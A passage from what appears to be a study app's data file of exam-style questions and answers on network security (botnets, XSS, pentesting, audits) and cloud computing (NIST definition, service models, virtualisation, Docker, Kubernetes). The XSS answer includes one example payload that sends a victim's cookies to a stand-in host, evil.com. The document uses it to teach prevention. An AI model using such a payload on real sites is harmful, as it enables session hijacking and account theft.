  {q:"What is a botnet?",u:"Unit 06",a:`<span class="utag">Unit 06</span><p>A <strong>botnet</strong> (short for "robot network") is a network of internet-connected devices infected with malware that are controlled remotely by an attacker (botmaster or bot herder) without the device owners' knowledge. Each compromised device is called a <em>bot</em>, <em>zombie</em>, or <em>drone</em>.</p><p><strong>How botnets are built:</strong></p><ol><li>Attacker creates malware (bot client) and distributes it via phishing emails, malicious websites, drive-by downloads, vulnerability exploitation, or infected USB drives.</li><li>Malware silently installs on victim devices and connects to the attacker's C2 (Command and Control) server.</li><li>Attacker accumulates thousands to millions of compromised devices — forming the botnet.</li><li>Attacker issues commands through C2 (HTTP, IRC, peer-to-peer) to all bots simultaneously.</li></ol><p><strong>What botnets are used for:</strong></p><ul><li><strong>DDoS attacks:</strong> Coordinate thousands of bots to flood a target — the primary use. Mirai botnet (2016) used 600,000 IoT devices to launch 1.2 Tbps DDoS attacks.</li><li><strong>Spam campaigns:</strong> Send billions of phishing/spam emails using bots' IP addresses — bypasses spam filters and avoids attribution.</li><li><strong>Credential stuffing:</strong> Test stolen username/password pairs on thousands of websites using distributed bots to avoid IP rate-limiting.</li><li><strong>Cryptocurrency mining:</strong> Use bots' CPU/GPU power to mine cryptocurrency for the attacker (cryptojacking).</li><li><strong>Click fraud:</strong> Generate fraudulent ad clicks on publisher websites for revenue.</li><li><strong>Proxy networks:</strong> Rent out bot IPs as anonymous proxies.</li></ul><p><strong>Detection and removal:</strong> Unusual outbound traffic, high CPU/network usage, firewall alerts. Antivirus, network monitoring, and firmware updates (for IoT) help detect/prevent. ISPs and CERTs coordinate botnet takedowns.</p>`},
  {q:"What is cross-site scripting (XSS)?",u:"Unit 08",a:`<span class="utag">Unit 08</span><p><strong>Cross-Site Scripting (XSS)</strong> is a web security vulnerability where an attacker injects malicious client-side scripts (typically JavaScript) into web pages viewed by other users. The victim's browser executes the injected script in the context of the trusted website, allowing the attacker to steal session cookies, redirect users, log keystrokes, or deface pages. XSS is #2 in the OWASP Top 10.</p><p><strong>Three types of XSS:</strong></p><ul><li><strong>Reflected (Non-persistent):</strong> Malicious script is in the URL — victim must click a crafted link. Example: <code>https://bank.com/search?q=&lt;script&gt;document.location='evil.com/steal?c='+document.cookie&lt;/script&gt;</code>. Script is reflected in the page response and executed. Common in search boxes and error messages.</li><li><strong>Stored (Persistent):</strong> Most dangerous. Script is permanently stored in the database (e.g., in a comment, profile bio, message). Every user who views that content executes the script. Example: forum post containing JavaScript that steals all readers' session cookies — one attack affects all visitors.</li><li><strong>DOM-based:</strong> Vulnerability exists in client-side JavaScript that manipulates the DOM using untrusted data. Never touches the server — happens entirely in the browser.</li></ul><p><strong>Prevention:</strong></p><ul><li><strong>Output encoding (escaping):</strong> Always encode user-supplied data before inserting into HTML (<code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>"</code>, <code>'</code> → HTML entities). Prevents browser from interpreting content as executable script.</li><li><strong>Content Security Policy (CSP):</strong> HTTP header that restricts which scripts can execute — blocks inline scripts and scripts from unknown origins.</li><li><strong>HTTPOnly cookies:</strong> Set HTTPOnly flag on session cookies — JavaScript cannot access them, limiting cookie theft.</li><li><strong>Input validation:</strong> Reject unexpected HTML/JavaScript tags in user input.</li><li><strong>Frameworks:</strong> React, Angular auto-escape output by default — use only safe rendering APIs (innerHTML is dangerous).</li></ul>`},
  {q:"What is a penetration test? How does it differ from vulnerability assessment?",u:"Unit 08",a:`<span class="utag">Unit 08</span><p>Both are proactive security testing methods, but they differ in depth, methodology, and deliverables.</p><p><strong>Vulnerability Assessment:</strong> A systematic scan to identify, quantify, and prioritise known security weaknesses (vulnerabilities) in systems and applications — without attempting to exploit them.</p><ul><li><strong>Tools:</strong> Automated scanners — Nessus, OpenVAS, Qualys, Rapid7 Nexpose. Scans known CVE databases against detected software versions.</li><li><strong>Output:</strong> A list of vulnerabilities with severity ratings (Critical/High/Medium/Low) and remediation recommendations.</li><li><strong>Scope:</strong> Broad coverage — scans many systems quickly.</li><li><strong>Depth:</strong> Identifies what vulnerabilities exist. Does not prove they are exploitable — some findings are false positives.</li></ul><p><strong>Penetration Testing (Pentest):</strong> A simulated cyber attack where a skilled security professional (ethical hacker/pentester) attempts to actively exploit vulnerabilities to determine actual impact and assess real security posture.</p><ul><li><strong>Tools:</strong> Metasploit, Burp Suite, Nmap, Wireshark, custom exploits, social engineering.</li><li><strong>Output:</strong> Detailed report with: exploited vulnerabilities with proof-of-concept evidence, actual data/systems accessed, business impact assessment, and prioritised remediation.</li><li><strong>Depth:</strong> Proves vulnerabilities are actually exploitable. Reveals chained attacks (low-severity vuln A + vuln B = critical breach).</li><li><strong>Types:</strong> Black box (no knowledge), White box (full knowledge), Grey box (limited knowledge).</li></ul><p><strong>Key differences:</strong></p><ul><li>VA finds vulnerabilities; pentest proves their exploitability and business impact.</li><li>VA is automated and broad; pentest is manual, deep, and targeted.</li><li>VA is cheaper and faster; pentest is expensive (senior security expertise needed).</li><li>VA is continuous; pentest is periodic (annually, after major changes, or compliance-driven).</li></ul><p>Both are complementary: VA identifies what to fix; pentest validates whether fixes worked and finds logic flaws automated tools miss.</p>`},
  {q:"What is a security audit?",u:"Unit 08",a:`<span class="utag">Unit 08</span><p>A <strong>security audit</strong> is a systematic, independent examination and evaluation of an organisation's information security policies, procedures, controls, and technical systems to assess compliance with established standards, identify security gaps, and verify that security measures are functioning as intended.</p><p><strong>Types of security audits:</strong></p><ul><li><strong>Internal audit:</strong> Conducted by the organisation's own internal audit team. Regular, ongoing monitoring of security controls and policy compliance.</li><li><strong>External audit:</strong> Independent third-party auditors provide an objective assessment. Required for regulatory compliance (ISO 27001 certification, SOC 2, PCI DSS).</li><li><strong>Compliance audit:</strong> Verifies adherence to specific regulations — GDPR, HIPAA (healthcare), PCI DSS (payment cards), ISO/IEC 27001, RBI cybersecurity framework (Indian banks).</li><li><strong>Technical audit:</strong> Focuses on IT infrastructure — network configuration review, firewall rule analysis, access control review, patch management assessment.</li></ul><p><strong>Security audit process:</strong></p><ol><li><strong>Planning:</strong> Define scope, objectives, applicable standards, and audit team. Risk-based approach — focus on highest-risk areas.</li><li><strong>Evidence collection:</strong> Review policies, procedures, and documentation. Interview staff. Observe operations. Use audit tools (vulnerability scanners, log analysers, configuration checkers).</li><li><strong>Analysis:</strong> Compare actual state against desired state (policy/standard). Identify gaps and control weaknesses.</li><li><strong>Reporting:</strong> Document findings — non-conformities, observations, recommendations. Risk-rated findings with remediation priority.</li><li><strong>Follow-up:</strong> Verify remediation of findings in next audit cycle.</li></ol><p><strong>Common security audit frameworks:</strong> ISO/IEC 27001 (ISMS), NIST Cybersecurity Framework, CIS Controls, COBIT. Security audit reports are critical for board-level governance, insurance underwriters, and partner due diligence.</p>`},
 ]
},

cloud:{
 long:[
  {q:"Trace the evolution and history of cloud computing. What major milestones made modern cloud possible?",u:"Unit 01",a:`<span class="utag">Unit 01</span><p>Cloud computing's evolution spans seven decades — from room-sized mainframes shared by a few scientists to globally distributed systems serving billions of users daily. Understanding this history helps explain why cloud is architected the way it is today.</p><p><strong>1950s-60s — Mainframe Time-Sharing:</strong> The conceptual ancestor of cloud computing. IBM and others deployed large mainframe computers accessible to multiple users through "dumb terminals." John McCarthy (1961) predicted that "computation may someday be organised as a public utility" — a remarkably prescient statement. ARPA (Advanced Research Projects Agency) began networking research.</p><p><strong>1969 — ARPANET:</strong> The forerunner of the Internet — connected four university computers. Demonstrated that geographically separated computers could share resources over a network. J.C.R. Licklider's vision of an "Intergalactic Computer Network" (1963) begins to materialise.</p><p><strong>1970s-80s — Virtualisation origins:</strong> IBM's VM/370 (1972) introduced virtual machines — multiple isolated OS instances on one physical machine. This virtualisation concept is the technical foundation of all modern cloud infrastructure. Client-server computing emerged — distributed computation between client machines and central servers.</p><p><strong>1990s — Internet commercialisation and early Web hosting:</strong> Telcos began offering VPN services (sharing physical network infrastructure among multiple customers). ISPs (Internet Service Providers) emerged — early utility model for network access. Web hosting providers offered "virtual servers" on shared physical machines. The term "cloud" begins appearing in network diagrams to abstractly represent the Internet.</p><p><strong>1999 — Salesforce.com:</strong> The first major Software-as-a-Service (SaaS) company — delivered enterprise CRM applications entirely through the web browser. Proved the viability of the SaaS model: no software installation required, pay-per-subscription, always up-to-date.</p><p><strong>2002 — Amazon Web Services (early):</strong> Amazon began offering internal infrastructure services to its development teams. Recognised that this infrastructure could be offered externally. Jeff Bezos's insight: Amazon's real business is elastic, API-driven infrastructure, not just bookselling.</p><p><strong>2006 — AWS Launch (The Defining Moment):</strong> Amazon launched Simple Storage Service (S3) in March 2006 — unlimited, pay-per-use object storage. Elastic Compute Cloud (EC2) launched August 2006 — rent virtual servers by the hour. This is the birth of modern cloud computing. The pay-as-you-go, elastic, self-service model revolutionised IT delivery.</p><p><strong>2008 — Google App Engine and Microsoft Azure announced.</strong> Multiple providers validate and compete in the market. Open-source cloud: OpenStack project (2010) — Rackspace + NASA. Enables private cloud deployment.</p><p><strong>2009 — Virtualisation matures:</strong> VMware dominates enterprise virtualisation. Cloud providers adopt hypervisors (Xen, KVM) at massive scale. Live migration (moving running VMs between physical hosts) becomes practical.</p><p><strong>2011 — NIST Cloud Definition (SP 800-145):</strong> NIST formally defined cloud computing with 5 characteristics, 3 service models, 4 deployment models — providing a standardised framework. Industry alignment around NIST definition accelerated enterprise cloud adoption.</p><p><strong>2013-2015 — Containerisation:</strong> Docker (2013) — lightweight, portable application containers that package code with dependencies. Kubernetes (2014, from Google Borg) — container orchestration at scale. This revolutionised how applications are deployed and scaled in cloud environments. Microservices architecture emerges.</p><p><strong>2014-present — Serverless / FaaS:</strong> AWS Lambda (2014) — execute functions without managing servers. Pay only for compute time consumed. Event-driven architecture at planetary scale.</p><p><strong>2020s — Multi-cloud, AI/ML cloud services:</strong> Organisations routinely use multiple cloud providers. Cloud-native AI/ML services (AWS SageMaker, Google Vertex AI, Azure ML) democratise machine learning. Edge computing extends cloud to the network edge (5G + cloud convergence). FinOps emerges as a discipline for managing cloud costs.</p>`},
  {q:"Explain the NIST definition of cloud computing. Describe the 5 essential characteristics in detail.",u:"Unit 01",a:`<span class="utag">Unit 01</span><p>The authoritative definition of cloud computing comes from the US National Institute of Standards and Technology (NIST) Special Publication 800-145 (2011), authored by Peter Mell and Timothy Grance: <em>"Cloud computing is a model for enabling ubiquitous, convenient, on-demand network access to a shared pool of configurable computing resources (e.g., networks, servers, storage, applications, and services) that can be rapidly provisioned and released with minimal management effort or service provider interaction."</em></p><p>NIST identifies five essential characteristics that collectively define cloud computing. ALL five must be present for something to be considered true cloud computing.</p><p><strong>1. On-Demand Self-Service:</strong> A consumer can unilaterally provision computing capabilities — such as server time and network storage — as needed automatically without requiring human interaction with each service provider. A developer can log into the AWS console at 2 AM on a Sunday, click a few times, and have a 100-server cluster running in minutes — without calling a sales representative, filling a purchase order, or waiting weeks for hardware procurement. This eliminates organisational bottlenecks and enables rapid experimentation.</p><p><strong>2. Broad Network Access:</strong> Capabilities are available over the network and accessed through standard mechanisms that promote use by heterogeneous thin or thick client platforms (e.g., mobile phones, tablets, laptops, and workstations). Cloud services are accessible via standard protocols (HTTP/HTTPS, REST APIs, gRPC) from any device with an Internet connection — not just specific hardware or specialised client software. This enables remote work, mobile access, and global teams.</p><p><strong>3. Resource Pooling:</strong> The provider's computing resources are pooled to serve multiple consumers using a multi-tenant model, with different physical and virtual resources dynamically assigned and reassigned according to consumer demand. There is a sense of location independence in that the customer generally has no control or knowledge over the exact location of the provided resources. This is the economic engine of cloud — sharing physical infrastructure among thousands of tenants dramatically reduces per-unit cost. Economies of scale: Amazon can buy servers at 80% discount compared to a typical enterprise; energy efficiency through high utilisation rates (80%+ vs 15-20% on-premises).</p><p><strong>4. Rapid Elasticity:</strong> Capabilities can be elastically provisioned and released — in some cases automatically — to scale rapidly outward and inward commensurate with demand. To the consumer, the capabilities available for provisioning often appear to be unlimited and can be appropriated in any quantity at any time. Black Friday: an e-commerce site scales from 100 to 10,000 servers in minutes to handle peak traffic, then scales back down. Without cloud elasticity, the company would need to provision for peak capacity year-round — massive waste. Auto-scaling groups monitor CPU/traffic metrics and automatically add/remove capacity.</p><p><strong>5. Measured Service:</strong> Cloud systems automatically control and optimise resource use by leveraging a metering capability at some level of abstraction appropriate to the type of service (e.g., storage, processing, bandwidth, and active user accounts). Resource usage can be monitored, controlled, and reported — providing transparency for both the provider and consumer of the utilised service. Billing is granular (per-second for EC2, per-request for Lambda, per-GB for S3). Pay only for what you use — no idle capacity cost. Detailed usage dashboards enable cost optimisation. Chargebacks to internal teams based on actual consumption.</p><p><strong>Why all 5 must coexist:</strong> A private data centre with virtualisation has resource pooling but lacks on-demand self-service and rapid elasticity (provisioning takes days). A colocation facility has broad network access but lacks pooling and measured service. Traditional managed hosting has measured service but not on-demand self-service. True cloud requires all five simultaneously — each reinforces the others to create the transformative cloud model.</p>`},
  {q:"Explain IaaS, PaaS, and SaaS service models with examples. How do responsibilities differ?",u:"Unit 02",a:`<span class="utag">Unit 02</span><p>The three cloud service models (IaaS, PaaS, SaaS) define how much of the IT stack the cloud provider manages versus how much the customer manages. Choosing the right model depends on the organisation's technical capabilities, control requirements, and operational overhead tolerance.</p><p><strong>Traditional On-Premises (baseline comparison):</strong> Customer manages everything — hardware, networking, storage, virtualisation, OS, middleware, runtime, data, applications. Full control, full responsibility, high capital expenditure (CapEx).</p><p><strong>IaaS — Infrastructure as a Service:</strong> Provider manages: physical hardware, networking, storage, hypervisors/virtualisation. Customer manages: OS, middleware, runtime, data, applications. Customer rents virtualised compute, storage, and networking on-demand and builds their stack on top.</p><ul><li><strong>Examples:</strong> AWS EC2 (virtual machines), AWS S3 (object storage), AWS VPC (virtual networking), Google Compute Engine, Microsoft Azure Virtual Machines, DigitalOcean Droplets.</li><li><strong>Use cases:</strong> Migrating existing applications ("lift and shift") without refactoring. High-performance computing, big data processing. Development/test environments. Web hosting with full OS control (e.g., install custom database versions). Disaster recovery site.</li><li><strong>Advantages:</strong> Maximum flexibility and control over OS/middleware. Can run any software. Pay-as-you-go hardware. No upfront capital investment. Scale independently.</li><li><strong>Disadvantages:</strong> Still responsible for OS patching, security hardening, runtime management. Higher operational overhead than PaaS/SaaS.</li></ul><p><strong>PaaS — Platform as a Service:</strong> Provider manages: everything IaaS manages + OS, middleware, runtime, database engines, development frameworks. Customer manages: application code, data, configuration.</p><ul><li><strong>Examples:</strong> AWS Elastic Beanstalk, Google App Engine, Heroku, Microsoft Azure App Service, AWS RDS (managed database), Google Cloud SQL, Salesforce Platform, AWS Lambda (serverless PaaS).</li><li><strong>Use cases:</strong> Web application development without managing servers. Managed databases (no DBA for patching, backups, HA). API backends. Rapid prototyping. Microservices.</li><li><strong>Advantages:</strong> Developers focus purely on application code — infrastructure is abstracted. Automatic OS patching and platform updates. Built-in scalability, availability, and monitoring. Faster time-to-market.</li><li><strong>Disadvantages:</strong> Vendor lock-in (AWS Lambda code is not portable). Less control over platform configuration. May not support all programming languages or frameworks.</li></ul><p><strong>SaaS — Software as a Service:</strong> Provider manages everything — infrastructure through the application itself. Customer only manages: data and user configuration/settings. Software is consumed as a service over the Internet — no installation, no maintenance.</p><ul><li><strong>Examples:</strong> Google Workspace (Gmail, Docs, Drive), Microsoft 365, Salesforce CRM, Zoom, Slack, Dropbox, Netflix, ServiceNow, Workday (HR), SAP SuccessFactors.</li><li><strong>Use cases:</strong> Email and productivity suites. CRM systems. HR management. Video conferencing. Project management tools. Any software where the organisation wants zero infrastructure concern.</li><li><strong>Advantages:</strong> Zero infrastructure management. Automatic updates and new features. Pay per user per month. Accessible from any device. No upfront software licensing.</li><li><strong>Disadvantages:</strong> Least control — cannot customise deeply. Data resides with provider (privacy/compliance concerns). Dependent on Internet connectivity. Vendor lock-in for data formats.</li></ul><p><strong>Shared Responsibility Model:</strong> Security responsibilities are split between provider and customer. In IaaS — customer is responsible for OS security, application security, data encryption, network configurations in their VPC. In PaaS — provider handles OS/runtime security; customer handles application security and data. In SaaS — provider handles almost all security; customer handles user access management and data classification. Understanding this division is critical — many cloud security breaches occur in the customer-managed layer (misconfigured S3 buckets, weak IAM policies).</p>`},
  {q:"Compare public, private, and hybrid cloud deployment models. When should each be used?",u:"Unit 03",a:`<span class="utag">Unit 03</span><p>Cloud deployment models define who owns and operates the cloud infrastructure and who has access to it. Choosing the right model requires balancing cost, security, compliance, performance, and control requirements.</p><p><strong>Public Cloud:</strong> Cloud infrastructure is owned and operated by a third-party cloud provider and made available to the general public over the Internet. Multiple customers (tenants) share the same physical infrastructure, logically isolated by virtualisation. Examples: AWS, Microsoft Azure, Google Cloud Platform (GCP), Alibaba Cloud, IBM Cloud.</p><ul><li><strong>Advantages:</strong> No capital expenditure — pay-as-you-go. Unlimited scalability (AWS has millions of servers). Rapid deployment. Global availability (AWS has 33+ regions). No infrastructure management overhead. Latest technology always available (AI/ML services, new instance types).</li><li><strong>Disadvantages:</strong> Multi-tenancy security concerns (though well-managed by providers). Limited customisation of underlying infrastructure. Data sovereignty concerns (data may reside in foreign jurisdiction). Network latency for latency-sensitive on-premises applications.</li><li><strong>Best for:</strong> Startups and SMEs (no capital for own infrastructure). Variable workloads (dev/test, seasonal traffic peaks). New application development ("cloud-native"). Globally distributed applications. Big data/analytics.</li></ul><p><strong>Private Cloud:</strong> Cloud infrastructure is operated exclusively for a single organisation — either on-premises or hosted by a third party. Resources not shared with other organisations. Technologies: VMware vSphere, OpenStack, Microsoft Azure Stack, AWS Outposts, Nutanix.</p><ul><li><strong>Advantages:</strong> Maximum security and privacy — dedicated infrastructure, no shared tenants. Full control over hardware, software, and data residency. Customisation to specific requirements. Meets strict regulatory requirements (financial, healthcare, government, defence).</li><li><strong>Disadvantages:</strong> Significant capital expenditure — own/lease hardware. Capacity planning required — cannot elastically scale beyond owned hardware. IT team required for management. Takes weeks/months to deploy new infrastructure. Cannot match public cloud's global reach.</li><li><strong>Best for:</strong> Organisations with strict data sovereignty requirements. Highly regulated industries (banking, healthcare, government). Organisations with steady, predictable workloads that justify CapEx. Sensitive R&D workloads. Legacy applications requiring custom hardware.</li></ul><p><strong>Hybrid Cloud:</strong> Combines public and private clouds with technology enabling data and application portability between them. Organisations can run sensitive workloads on private cloud while bursting overflow to public cloud ("cloud bursting"). Examples: AWS Direct Connect/Azure ExpressRoute connecting on-premises to cloud. Azure Arc/AWS Outposts for consistent management across environments.</p><ul><li><strong>Advantages:</strong> Best of both worlds — security of private cloud + scalability of public cloud. Flexibility to optimise workload placement by cost, performance, compliance. Gradual cloud migration path. Business continuity — failover between private and public.</li><li><strong>Disadvantages:</strong> Most complex to manage (two different infrastructure environments). Integration and networking complexity (VPN, Direct Connect, hybrid identity). Security perimeter management across both environments. Higher management cost.</li><li><strong>Best for:</strong> Large enterprises with existing on-premises investments. Regulated industries that must keep some data on-premises while using cloud for other workloads. Disaster recovery (public cloud as DR site). Seasonal workloads on a baseline private infrastructure with cloud bursting for peaks.</li></ul><p><strong>Community Cloud:</strong> (NIST's fourth deployment model) Shared by a specific community with common interests (compliance, security, mission). Example: Government cloud (AWS GovCloud, Azure Government), healthcare cloud. Between private (exclusive) and public (everyone) in terms of access.</p><p><strong>Multi-Cloud:</strong> Using services from multiple public cloud providers (e.g., AWS for compute + GCP for ML + Azure for Microsoft 365 integration). Avoids vendor lock-in. Maximises best-of-breed services. Increases resilience (if one cloud has an outage). Complexity: multiple APIs, billing, IAM, and networking to manage. Used by most large enterprises today.</p>`},
  {q:"What is virtualisation? Explain hypervisors, VMs, and containers. How does virtualisation enable cloud?",u:"Unit 04",a:`<span class="utag">Unit 04</span><p><strong>Virtualisation</strong> is the process of creating software-based (virtual) representations of physical resources — compute, storage, and networking — allowing multiple workloads to share a single physical machine efficiently. It is the foundational technology of cloud computing: every cloud VM is a virtualised instance of physical hardware.</p><p><strong>Before virtualisation:</strong> One application per physical server (to avoid software conflicts). Typical server CPU utilisation: 5-15%. Massive hardware waste, high cost, slow provisioning (weeks), difficult isolation.</p><p><strong>With virtualisation:</strong> One physical server runs 10-100 virtual machines. CPU utilisation: 60-90%. Hardware cost divided by number of VMs. Provisioning in seconds. Complete isolation between VMs (a crash in one VM doesn't affect others).</p><p><strong>Hypervisor (Virtual Machine Monitor — VMM):</strong> The software layer that creates and manages virtual machines. It abstracts physical hardware and presents each VM with its own virtualised hardware (vCPU, vRAM, vNIC, vDisk).</p><p><strong>Type 1 Hypervisor (Bare-Metal):</strong> Runs directly on physical hardware — no host OS below it. Closest to hardware = best performance. Examples: VMware ESXi, Microsoft Hyper-V, Xen (used by AWS EC2), KVM (Linux Kernel-based VM — used by AWS, GCP, OpenStack). Used in: enterprise data centres, cloud providers.</p><p><strong>Type 2 Hypervisor (Hosted):</strong> Runs on top of a host OS (Windows, macOS, Linux). Host OS manages hardware; hypervisor is just another application. Examples: VMware Workstation, Oracle VirtualBox, Parallels Desktop. Used for: developer desktop testing, running multiple OS for software testing. More overhead than Type 1.</p><div class="code">// VM vs physical server analogy:
// Physical: 1 house = 1 family
// VM: 1 apartment building = 100 families (isolated units, shared foundation)

// Hypervisor resource allocation:
Physical: 64 CPU cores, 512 GB RAM, 10 TB SSD
VM1:  4 vCPUs, 16 GB RAM, 100 GB disk  -- Dev server
VM2:  8 vCPUs, 32 GB RAM, 500 GB disk  -- Production web server
VM3: 16 vCPUs, 64 GB RAM, 2 TB disk   -- Database server
VM4:  2 vCPUs,  4 GB RAM,  50 GB disk  -- Monitoring server
// Remaining resources available for more VMs</div><p><strong>Containers (OS-level virtualisation):</strong> Unlike VMs that virtualise hardware (each VM has its own OS kernel), containers share the host OS kernel and virtualise at the OS process level. Each container has its own filesystem, network namespace, and process space — but shares the kernel with the host.</p><ul><li><strong>Docker (2013):</strong> Standardised container packaging — Dockerfile defines the container image. Container images are portable (run on any Docker host). Docker Hub: central registry of 100,000+ public images (nginx, postgres, redis, python, node, etc.).</li><li><strong>VM vs Container:</strong> VM: full OS per instance, GB of overhead, minutes to start, strong isolation. Container: shared kernel, MB overhead, seconds to start, process-level isolation. Containers are faster, lighter, and more portable but less isolated than VMs.</li></ul><div class="code"># Dockerfile example -- package a Python web app
FROM python:3.11-slim           # base image (Python + slim Linux)
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt   # install dependencies into image
COPY . .
EXPOSE 8080
CMD ["python", "app.py"]        # default command when container starts

# Build and run:
# docker build -t myapp:1.0 .
# docker run -p 8080:8080 myapp:1.0</div><p><strong>Kubernetes (K8s):</strong> Container orchestration platform for deploying, scaling, and managing containerised applications. Key concepts: Pods (smallest deployable unit — one or more containers), Services (stable network endpoint), Deployments (desired state), HorizontalPodAutoscaler (auto-scaling). Managed K8s: AWS EKS, Google GKE, Azure AKS.</p><p><strong>How virtualisation enables cloud:</strong> Multi-tenancy: hundreds of customer VMs on one physical host. Rapid provisioning: launch VM from image in 30 seconds. Elasticity: clone VMs instantly to scale. Live migration: move running VMs between physical hosts for maintenance without downtime. Isolation: each customer's VMs are completely isolated. Resource metering: track CPU/memory/disk per VM for billing. Snapshotting: backup VM state instantly. These capabilities are only possible because of virtualisation.</p>`},
  {q:"Explain cloud security. What are the major threats? How does the shared responsibility model work?",u:"Unit 05",a:`<span class="utag">Unit 05</span><p>Cloud security encompasses the technologies, policies, controls, and procedures that protect cloud systems, data, and infrastructure. It addresses unique cloud-specific security challenges while maintaining the same core security goals: confidentiality, integrity, and availability (CIA triad).</p><p><strong>Cloud-Specific Security Challenges:</strong></p><ul><li><strong>Loss of physical control:</strong> Data resides on provider's hardware — customers cannot physically inspect or control. Security relies on provider's implementation and certifications (SOC 2, ISO 27001, FedRAMP).</li><li><strong>Multi-tenancy risks:</strong> Shared infrastructure — hypervisor/container vulnerabilities could allow cross-tenant attacks (VM escape, speculative execution attacks like Spectre/Meltdown).</li><li><strong>Data sovereignty:</strong> Data may be stored/processed in jurisdictions with different legal frameworks. GDPR compliance requires data to remain in EU for EU residents.</li><li><strong>Expanded attack surface:</strong> Public APIs, management consoles, and services exposed to the Internet — all potential entry points for attackers.</li><li><strong>Misconfiguration as the #1 threat:</strong> Gartner estimates 99% of cloud security failures through 2025 will be the customer's fault. Common misconfigurations: publicly accessible S3 buckets (Capital One breach: 100M records, 2019), overly permissive IAM roles, unencrypted storage, security groups allowing all inbound traffic (0.0.0.0/0).</li></ul><p><strong>OWASP Cloud Top 10 Threats (key ones):</strong></p><ul><li>Misconfigured cloud storage (S3, Azure Blob) — inadvertently public.</li><li>Insufficient IAM controls — overprivileged roles, no MFA on root account.</li><li>Insecure APIs — unauthenticated endpoints, injection vulnerabilities.</li><li>Account hijacking — phishing for cloud console credentials.</li><li>Insecure interfaces and APIs — weak authentication on management APIs.</li><li>Data breaches — exposure of sensitive data through misconfiguration or attack.</li><li>Insider threats — malicious or negligent employees with cloud access.</li><li>Cryptomining attacks — attackers use compromised cloud accounts to mine cryptocurrency at victim's expense.</li></ul><p><strong>Shared Responsibility Model:</strong> Security responsibility is divided between the cloud provider and customer. The exact division depends on the service model.</p><p><strong>Cloud Provider is ALWAYS responsible for:</strong> Physical security of data centres (biometric access, guards, cameras, natural disaster protection). Hardware (servers, storage, networking equipment). Hypervisor security. Global network infrastructure. Foundation services availability.</p><p><strong>Customer responsibilities vary by service model:</strong></p><ul><li><strong>IaaS (EC2, Azure VM):</strong> Customer responsible for OS patching and hardening, application security, data encryption, network security groups (firewall rules), identity and access management (IAM), monitoring and logging configuration.</li><li><strong>PaaS (RDS, App Engine):</strong> Customer responsible for application code security, data encryption, user access control, API security. Provider handles OS/platform patching.</li><li><strong>SaaS (Office 365, Salesforce):</strong> Customer responsible for user account management, access control, data classification, and ensuring compliance with usage policies.</li></ul><p><strong>Cloud Security Controls:</strong></p><ul><li><strong>IAM:</strong> Principle of least privilege — grant minimum permissions. MFA for all accounts. Service accounts/roles instead of long-lived access keys. AWS IAM, Azure AD, GCP IAM.</li><li><strong>Encryption:</strong> Encrypt data at rest (AES-256 — default in all major clouds) and in transit (TLS 1.2+). Customer-managed keys (CMK) for maximum control. AWS KMS, Azure Key Vault, GCP Cloud KMS.</li><li><strong>Network security:</strong> VPC with private subnets. Security Groups (stateful firewall). NACLs (stateless). VPN/Direct Connect for private connectivity. WAF for web applications. DDoS protection (AWS Shield, Azure DDoS Protection).</li><li><strong>Monitoring:</strong> Cloud-native SIEM (AWS CloudTrail, GuardDuty, Security Hub; Azure Sentinel; GCP Security Command Center). Centralised logging. Alerts on suspicious API calls, unusual login patterns, resource deletions.</li><li><strong>Compliance:</strong> Cloud providers certify to major compliance standards: PCI DSS (payments), HIPAA (healthcare US), ISO 27001, SOC 2, FedRAMP (US government), C5 (Germany), MTCS (Singapore). Customers must configure services correctly to achieve compliance — certification doesn't guarantee compliance.</li></ul>`},
  {q:"What is containerisation and Kubernetes? How do they relate to cloud-native development?",u:"Unit 06",a:`<span class="utag">Unit 06</span><p><strong>Containerisation</strong> packages an application and all its dependencies (libraries, configuration files, runtime) into a single, portable, self-contained unit (container) that runs consistently across any environment — developer laptop, test server, or cloud production cluster. The containers share the host OS kernel but are isolated from each other via Linux namespaces and cgroups.</p><p><strong>Docker — Container Fundamentals:</strong></p><div class="code"># Complete web application containerisation example

# --- Dockerfile (defines the container image) ---
FROM python:3.11-slim AS builder
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

FROM python:3.11-slim         # multi-stage build -- smaller final image
WORKDIR /app
COPY --from=builder /usr/local/lib/python3.11/site-packages/ \
    /usr/local/lib/python3.11/site-packages/
COPY src/ .
ENV FLASK_ENV=production
EXPOSE 5000
HEALTHCHECK --interval=30s --timeout=3s CMD curl -f http://localhost:5000/health
USER nobody                   # don't run as root
CMD ["python", "app.py"]

# --- docker-compose.yml (local multi-container development) ---
version: '3.8'
services:
  web:
    build: .
    ports: ["5000:5000"]
    environment:
      DB_HOST: postgres
    depends_on: [postgres, redis]
  postgres:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: secret
    volumes: ["pgdata:/var/lib/postgresql/data"]
  redis:
    image: redis:7-alpine
volumes:
  pgdata:</div><p><strong>Kubernetes (K8s) — Container Orchestration:</strong> When running containers at scale (hundreds of microservices, thousands of instances), manual Docker management is impractical. Kubernetes automates deployment, scaling, load balancing, self-healing, and rollouts of containerised applications.</p><div class="code"># Kubernetes Deployment manifest (YAML)
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-app
  namespace: production
spec:
  replicas: 3                   # run 3 instances
  selector:
    matchLabels:
      app: web-app
  template:
    metadata:
      labels:
        app: web-app
    spec:
      containers:
      - name: web-app
        image: myrepo/web-app:v2.1.0
        ports:
        - containerPort: 5000
        resources:
          requests: {cpu: "100m", memory: "128Mi"}
          limits:   {cpu: "500m", memory: "512Mi"}
        livenessProbe:          # K8s restarts if health check fails
          httpGet: {path: /health, port: 5000}
          initialDelaySeconds: 30
          periodSeconds: 10
        env:
        - name: DB_HOST
          valueFrom:
            secretKeyRef: {name: db-secret, key: host}
---
apiVersion: v1
kind: Service
metadata:
  name: web-app-svc
spec:
  selector:
    app: web-app
  ports:
  - port: 80
    targetPort: 5000
